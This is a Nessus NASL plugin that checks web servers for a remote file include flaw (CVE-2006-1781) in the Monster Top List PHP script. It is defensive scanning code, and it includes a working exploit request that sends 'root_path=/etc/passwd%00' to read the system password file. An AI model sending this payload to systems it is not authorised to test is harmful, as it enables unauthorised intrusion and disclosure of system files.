#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by a
remote file include vulnerability. 

Description :

The remote host is running Monster Top List, a site rating script
written in PHP. 

The installed version of Monster Top List fails to sanitize user input
to the 'root_path' parameter in sources/functions.php before using it
to include PHP code from other files.  An unauthenticated attacker may
be able to read arbitrary local files or include a file from a remote
host that contains commands which will be executed on the remote host
subject to the privileges of the web server process. 

This flaw is only exploitable if PHP's 'register_globals' is enabled. 

See also : 

http://pridels.blogspot.com/2006/04/monstertoplist.html

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(21309);
  script_version("$Revision: 1.2 $");
  script_bugtraq_id(17546);
  script_cve_id("CVE-2006-1781");
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"24650");
  }

  name["english"] = "Monster Top List Remote File Include";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for file includes in sources/functions.php";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Josh Zlatin-Amishav");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = make_list("/toplist", cgi_dirs());
else dirs = make_list(cgi_dirs());

# Loop through CGI directories.
foreach dir (dirs) {
  # Try to exploit the flaw in sources/functions.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/sources/functions.php?",
      "root_path=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or "Failed opening".
      #
      # nb: this suggests magic_quotes_gpc was enabled but passing 
      #     remote URLs might still work.
      egrep(string:res, pattern:"Warning.+/etc/passwd\0sources/func_output\.php.+failed to open stream")
    
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) content = res;

    if (content)
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        content
      );
    else report = desc["english"];

    security_warning(port:port, data:report);
    exit(0);
  }
}
